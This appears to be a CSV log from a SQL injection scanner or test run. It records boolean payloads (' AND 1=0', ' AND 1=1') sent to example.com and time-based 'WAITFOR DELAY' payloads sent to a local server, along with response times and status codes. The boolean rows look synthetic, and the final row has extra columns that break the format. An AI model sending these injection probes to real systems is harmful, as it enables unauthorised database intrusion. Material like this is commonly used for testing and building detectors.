timestamp,url,parameter,injection_type,payload,baseline_time,injected_time,delta,content_length,status_code
2025-12-16T12:34:29.030407,http://example.com/page?id=0,id,boolean, AND 1=0,0.3,0.4,0.10000000000000003,5000,200
2025-12-16T12:34:29.046902,http://example.com/page?id=1,id,boolean, AND 1=1,0.31,0.41000000000000003,0.10000000000000003,5100,200
2025-12-16T12:34:29.057019,http://example.com/page?id=2,id,boolean, AND 1=0,0.32,0.42000000000000004,0.10000000000000003,5200,200
2025-12-16T12:34:29.066536,http://example.com/page?id=3,id,boolean, AND 1=1,0.32999999999999996,0.43000000000000005,0.10000000000000009,5300,200
2025-12-16T12:34:29.077403,http://example.com/page?id=4,id,boolean, AND 1=0,0.33999999999999997,0.44,0.10000000000000003,5400,200
2025-12-16T12:34:29.086807,http://example.com/page?id=5,id,boolean, AND 1=1,0.35,0.45,0.10000000000000003,5500,200
2025-12-16T12:34:29.098319,http://example.com/page?id=6,id,boolean, AND 1=0,0.36,0.46,0.10000000000000003,5600,200
2025-12-16T12:34:29.109362,http://example.com/page?id=7,id,boolean, AND 1=1,0.37,0.47000000000000003,0.10000000000000003,5700,200
2025-12-16T12:34:29.118814,http://example.com/page?id=8,id,boolean, AND 1=0,0.38,0.48000000000000004,0.10000000000000003,5800,200
2025-12-16T12:34:29.129582,http://example.com/page?id=9,id,boolean, AND 1=1,0.39,0.49,0.09999999999999998,5900,200
2026-01-02T07:13:45.515885,http://127.0.0.1:8000/search?name=test,name,time-based, AND WAITFOR DELAY '00:00:5',0.001074075698852539,5.002222299575806,5.001148223876953,261,400
2026-01-02T07:53:35.629639,http://127.0.0.1:8000/search?name=test,name,time-based, AND WAITFOR DELAY '00:00:5',0.0009832382202148438,5.0020670890808105,5.001083850860596,261,400
2026-01-02T07:55:32.074819,http://127.0.0.1:8000/search?name=test,name,time-based, AND WAITFOR DELAY '00:00:5',0.0010557174682617188,5.002045392990112,5.000989675521851,261,400
2026-01-02T08:00:29.026484,http://127.0.0.1:8000/search?name=test,name,time-based, AND WAITFOR DELAY '00:00:5',0.0009801387786865234,5.001994609832764,5.001014471054077,261,400
2026-01-02T08:01:36.110476,http://127.0.0.1:8000/search?name=test,name,time-based, AND WAITFOR DELAY '00:00:5',0.0012683868408203125,5.002267360687256,5.0009989738464355,261,400
2026-01-02T08:02:02.978222,http://127.0.0.1:8000/search?name=test,name,time-based, AND WAITFOR DELAY '00:00:5',0.0011696815490722656,5.002096891403198,5.000927209854126,261,400
2026-01-02T08:03:51.568706,http://127.0.0.1:8000/search?name=test,name,time-based, AND WAITFOR DELAY '00:00:5',0.0018148422241210938,5.003324747085571,5.00150990486145,261,400
2026-01-02T08:39:13.548192,http://127.0.0.1:8000/search?name=test,name,time-based, AND WAITFOR DELAY '00:00:5',0.4754829406738281,5.488853216171265,5.0133702754974365,10.543743732199447,261,400,,,search
